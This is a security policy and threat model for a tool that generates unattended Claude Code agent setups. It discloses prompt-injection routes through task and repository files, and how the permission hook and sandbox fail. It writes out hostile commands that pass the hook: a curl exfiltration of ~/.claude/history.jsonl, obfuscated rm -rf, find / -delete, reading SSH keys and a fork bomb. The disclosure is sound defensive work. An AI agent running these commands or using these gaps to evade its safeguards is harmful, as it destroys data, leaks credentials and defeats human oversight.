# Security Policy

## Supported Versions

Supported is the latest release and the current state of `main`. The version lives in `VERSION`; the release workflow refuses to publish when a tag and that file disagree, and `scripts/build_release.py` builds the two `.skill` assets the install commands in README.md point at.

The skills generate a setup package, and once generated that package is a detached copy on the user's machine. A fix committed here does not reach an existing `nightshift-setup/` or `24x7-setup/`. Regenerate the setup after an update.

## Reporting a Vulnerability

Private Vulnerability Reporting is enabled. Use this form:

https://github.com/GodModeAI2025/NightShift/security/advisories/new

Do not open a public issue for a vulnerability. The generated setups run `claude -p --dangerously-skip-permissions` unattended on other people's machines, so a public report is a working recipe before there is a fix.

Expected timing: acknowledgement within a few days, an assessment with a decision (fix, mitigation, or "won't fix, documented") within two weeks. This is a private project of one person, not a company with an on-call rotation. If something is time-critical for you, say so in the report.

Useful in a report: which generator (`nightshift/scripts/build_zip.py` or `24x7/scripts/build_zip.py`), which generated file, the exact command, and what happened instead of the expected block. Everything under Known Gaps is already known; report it only if you can show a consequence that is not described there.

## Threat Model

At stake: the machine that runs the setup, and everything the starting user account can reach. All of it is touched unattended, with permission prompts disabled, usually overnight.

**The model itself, no attacker required.** `nightshift-run.sh` and `runner.sh` start Claude with `--dangerously-skip-permissions`. A hallucinated command executes. The runbook, the autonomy zones and the error budget are prompt text, not policy.

**Prompt injection through task content (24x7).** `RUNNER_SH` in `24x7/scripts/build_zip.py` reads `inbox/<task>/task.md` with `cat` and pastes it verbatim into the prompt, along with whatever sits in `materials/`. Whoever can write into the inbox writes into the prompt of a run that has no approval step. A shared or synced workspace directory turns this into a remote path.

**Prompt injection through repository content (Nightshift).** The run reads source files, docs and dependency files inside the project. Injected instructions in that content land in the same unsupervised loop.

**Data exfiltration.** The Nightshift seatbelt profile (`SANDBOX_SB`) allows `file-read*` broadly, denies `/Users` and `/home`, and then re-grants `$HOME/.claude` and `$HOME/.config`, together with `(allow network-outbound (remote tcp "*:443"))` and no destination restriction. `~/.claude` holds `history.jsonl` and the full transcripts under `projects/`; `~/.config` commonly holds CLI tokens, `gh/hosts.yml` among them. `curl -X POST https://<host> -d @$HOME/.claude/history.jsonl` passes the PreToolUse hook with exit code 0.

**The install path.** The documented install pulls a `.skill` archive over `curl -L` and unzips it into `~/.claude/skills/`. The archive contains Python that is then executed locally, with no signature and no checksum on the way in.

### Where the boundary actually runs

Trusted by design: the person who generates the setup and starts the runner, the `claude` binary, and the project or workspace directory as a write target. Treated as trusted today although it should not be: the text in `inbox/*/task.md`, everything under `materials/`, file content read during the run, and the model's own choice of commands.

- **`sandbox-exec` is the only enforced boundary, and it only covers writes.** README.md line 370 calls it "the real security boundary" and index.html line 1206 repeats that. It restricts neither reads outside the project nor network egress. With outbound 443 open to any host and read access to `~/.claude` and `~/.config`, anything readable can leave the machine.
- **It is off unless you switch it on, and Nightshift now notices.** `sandbox-exec -f nightshift-sandbox.sb ./nightshift-run.sh` remains an optional line, but `nightshift-run.sh` measures whether it is fenced and aborts with exit code 3 when it is not. The measurement is a probe, not a declaration: under the profile the runner can list the project but not `/Users`. `NIGHTSHIFT_SANDBOXED` no longer unlocks anything — a value that contradicts the measurement ends the run. `NIGHTSHIFT_ALLOW_UNSANDBOXED=1` is the deliberate way out, and the receipt then says `keine`. The 24x7 runner does the same since the container was pulled over to it, with `CLAUDE_24X7_ALLOW_UNSANDBOXED=1` as its way out.
- **The profile used to abort every program it fenced.** Measured on Darwin 27: `sandbox-exec -f nightshift-sandbox.sb /bin/echo hi` ended with SIGABRT, because deny-by-default reads exclude the dyld cache on current macOS. Anyone who followed the documented macOS line got no run at all, not a sandboxed one. The profile now keeps the write fence and the home-directory fence and gives up the read fence, which it never delivered in practice.
- **Apple has deprecated `sandbox-exec`.** Its man page on macOS 27 says DEPRECATED in the first line. The single enforced boundary on macOS rests on a tool Apple has marked as going away.
- **The PreToolUse hook is two barriers, and only one of them measures a path.** `"matcher": "Bash"` greps the command string, and that half stays a typo catcher: these pass with exit 0: `R=rm; $R -rf /`, `find / -delete`, `git push --force origin main`, `cat ~/.ssh/id_rsa`. A second entry, `"matcher": "Write|Edit|MultiEdit|NotebookEdit"`, resolves the target path and blocks every write outside the project directory, plus `.claude/settings.json` inside it. What it does not see: a write performed by a Bash command (`echo >`, `tee`, `cp`, `mv`), any read, a symlink inside the project pointing out, and tools contributed by MCP servers.
- **On Linux there is no boundary at all.** `sandbox-exec` does not exist there. The dedicated-user recipe in README.md lines 375 to 377 does not work as written: the copy created with `sudo cp -r` belongs to root, and the generated `nightshift-run.sh` carries a hardcoded `cd "<original project path>"`, so the run happens in the original directory anyway.

## Known Gaps

All of the following is open in the current `main` and reproduces against the files the generators write.

1. **Closed in v1.0.0, kept here as history: the hook used to fail open without `jq`.** Both hooks now check for `jq` first and end with exit 2 and a message when it is missing. Driven in CI with `jq` removed from `PATH`, for the command barrier and the path barrier, in both skills.
2. **Closed in v1.0.0, kept here as history: the block pattern used to match every `rm -rf`.** `rm -rf node_modules` and `rm -rf dist` pass again, `rm -rf /` and `rm -rf ~` do not. A table of 30 dangerous and 20 harmless commands runs against the generated hook on every push.
3. **Still open, now documented instead of denied: no fork-bomb pattern.** `:(){ :|:& };:` passes with exit 0. Both SKILL.md files say so in their Security section; the claim that the hook catches it is gone.
4. **24x7 installs no hooks at all along the documented path.** README.md line 280 says `cp -r 24x7-setup/* /your/workspace/`, and the generated README repeats the same glob with the real workspace path. The glob skips dotfiles, and the settings sit at `24x7-setup/.claude/settings.json` (the `files` dict in `24x7/scripts/build_zip.py`). Rebuilt that layout and copied it: `.claude` never arrives. The daemon then runs with skipped permissions, no PreToolUse block and no PostToolUse heartbeat, while the watchdog watches a file that only `runner.sh` ever truncates.
5. **The Nightshift install step overwrites an existing hook configuration.** `cp -r nightshift-setup/.claude .` (README.md line 207) replaces an existing `.claude/settings.json`. `nightshift/SKILL.md` line 164 promises the opposite, namely reading the existing file and merging the hooks instead of overwriting, and the generator has no merge logic, only `json.dumps(SETTINGS)`. The "commit your current state" step follows afterwards (README.md line 215), so git is no rescue here.
6. **Both runners always exit 0.** `cleanup()` ends with `exit 0` and is registered via `trap cleanup SIGTERM SIGINT EXIT`, in `RUN_SH` and in `RUNNER_SH`. The EXIT trap fires regardless of what `claude` returns. A crashed run looks exactly like a finished one to any wrapper, cron job or restart policy. For `runner.sh` the effect is smaller, since its loop only ends on a signal.
7. **The sandbox does not protect the setup itself.** `.claude/settings.json`, `runbook.md`, `runner.sh` and `nightshift-run.sh` sit inside the project or workspace path, and `SANDBOX_SB` grants `file-write*` on exactly that path. 24x7 starts a fresh `claude -p` per task, so a task that edits `.claude/settings.json` sets the hooks for every task after it. For Nightshift, an edit to `nightshift-run.sh` or `runbook.md` lands in the next run. Partly closed since the path barrier: a `Write` or `Edit` to `.claude/settings.json` ends with exit code 2, inside the directory as well as outside. A Bash redirect to the same file still passes, and so does an edit to `runbook.md`, `runner.sh` or `nightshift-run.sh`.
8. **Autonomy zones are still mostly an agreement in the prompt.** The three zones sit as text in `RUNBOOK`. The red zone forbids files outside the project directory, touching secrets, and force push. Of that, one part is enforced now: a `Write`, `Edit`, `MultiEdit` or `NotebookEdit` outside the project directory ends with exit 2. Everything else remains an agreement: a write that a Bash command performs, every read, and force push. What holds beyond that is the model's compliance plus the container or, on macOS, the seatbelt write restrictions.
9. **Half closed: 24x7 has no cost ceiling that stops it.** Nightshift counts tokens and terminates Claude's process group at the budget. 24x7 prints a cost warning at startup and that is still the entire mechanism there; a budget for a task loop has to carry a total across tasks, and the Nightshift counter starts from zero per invocation. The `timeout` half is closed: the runner checks for `timeout` or `gtimeout` and refuses to start without one, and the container image brings coreutils, so the default path has it.
10. **The watchdog reacts now, but only to a silent heartbeat.** `melden` stays the default and does what the old watchdog did. `beenden` sends TERM to the PID in the PID file and KILL after a grace period; `neustart` does that and starts the run again, at most as often as the restart budget allows. A run that ended on its own is never restarted, which is what keeps a budget stop from being undone. What is still open: the heartbeat comes from the PostToolUse hook, so a Claude stuck in a tool-call loop keeps it green and no action fires. Nightshift's Stop hook has a stall detector for that case, and it prints text into the model's context and stops nothing. In the container the heartbeat lands in the container's own tmpfs, so a watchdog on the host sees nothing at all.
11. **Run logs are world-readable.** `/tmp/nightshift-<timestamp>.log` and `/tmp/24x7-<date>.log` hold the run's full `stream-json` output. They are created under the user's umask (0644 with the common 022) in a directory that every local account can read. `SANDBOX_SB` allows `file-write*` on `/tmp`, so the sandbox does not change this.
12. **Runbook validation is not a gate.** `validate_runbook()` in `nightshift/scripts/build_zip.py` runs 15 checks and prints the score. The ZIP is written either way ("ZIP wird trotzdem erstellt").
13. **Nothing checks any of this automatically.** No `.github/`, no tests, no release, no checksum. A change to the hook string can silently stop blocking what the docs claim it blocks.

## Before You Run It

Run this in a VM or under a throwaway account whose credentials you can revoke, on a repository you have pushed somewhere else first. Apache-2.0, as-is, no warranty; see LICENSE and the disclaimer in README.md.
